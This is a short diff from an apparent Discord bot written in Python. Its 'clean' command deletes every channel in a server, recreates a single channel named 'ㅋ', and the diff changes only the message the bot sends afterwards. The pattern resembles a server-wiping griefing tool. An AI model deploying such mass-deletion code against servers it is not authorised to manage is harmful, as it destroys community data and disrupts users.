@@ -25,7 +25,7 @@ async def clean(ctx):
     for channel in guild.channels:
         await channel.delete()
     await ctx.guild.create_text_channel("ㅋ")
-    await ctx.message.send("이기야 초기화")
+    await ctx.send("ㅋ")
         
 @client.command()
 async def invite(ctx):
